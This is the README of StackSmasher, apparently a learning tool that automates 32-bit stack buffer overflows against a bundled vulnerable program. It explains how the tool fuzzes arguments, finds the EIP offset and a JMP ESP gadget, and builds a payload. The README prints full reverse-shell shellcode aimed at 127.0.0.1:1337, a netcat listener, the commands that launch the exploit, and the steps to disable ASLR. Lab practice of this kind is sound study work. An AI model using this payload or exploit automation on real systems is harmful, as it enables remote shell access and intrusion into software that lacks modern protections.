# StackSmasher

## Description
StackSmasher is an application which automatically performs a stack based buffer overflow on the target application. Currently it only supports attacking a vulnerable application through the application run time arguments. However, future modifications are to support various application inputs such as standard input and tcp input.

It will rerun the application many times to fuzz the input until a segmentation fault occurs. It will then find the offset of EIP, as well as the address of a JMP ESP instructions.

Finally it builds the final payload and outputs it.

## Modes
The application has two modes, verbose which outputs the information it has found as well as the exploit as a python script. The other mode is exploit mode which only outputs the exploit payload.

## Limitations
Various settings must be disabled for this to work including DEP, NX, and ASLR. ASLR needs to be done manually using the following script. This application also only works against 32 bit applications.

### Disable ASLR
```sh
sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```

### Enable ASLR
```sh
sudo bash -c "echo 2 > /proc/sys/kernel/randomize_va_space"
```

## Compiling

To compile the applications as 32 bit, you may need to install gcc-multilib.
```sh
sudo apt-get install gcc-multilib
```

Compile all applications.
```sh
make
```

## Running StackSmasher
### Verbose Mode
Running smasher in *verbose* mode with the prebuild payload (reverse shell on 127.0.0.1:1337) against the application *vulnerable*.

```sh
cd bin
chmod +x smasher vulnerable
./smasher verbose payload vulnerable
```

Example Output:
```sh
[-] Fuzzing EIP and finding JMP ESP...
[+] Found JMP ESP at 0x565561fe
[+] EIP found at offset 0x51e with length of 0x530
[+] python -c 'print("\x41...\x41\x41\xfe\x61\x55\x56\x90\x90...\x90\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xd3\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x00")'
```

Listen For Shell:
```sh
nc -lkp 1337
```

Executing Payload:
```sh
cd bin
./vulnerable $(python -c 'print("\x41...\x41\x41\xfe\x61\x55\x56\x90\x90...\x90\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xd3\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x00")')
```

### Exploit Mode
Running smasher in *exploit* mode with the prebuild payload (reverse shell on 127.0.0.1:1337) against the application *vulnerable*.

Listen For Shell:
```sh
nc -lkp 1337
```

Executing Payload:
```sh
./vulnerable $(./smasher exploit payload vulnerable)
```
